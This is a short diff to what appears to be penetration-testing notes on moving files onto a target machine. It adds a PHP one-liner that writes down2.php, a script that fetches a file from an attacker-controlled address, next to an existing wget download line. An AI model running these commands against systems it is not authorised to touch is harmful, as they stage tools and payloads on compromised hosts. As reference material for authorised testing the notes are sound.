@@ -87,5 +87,11 @@ Now you can download any file with curl or wget
 wget 192.168.1.102:9999/file.txt
 ```
 
+### With php
+
+```
+echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', 'r')); ?>" > down2.php
+```
+
 ###ftp
 
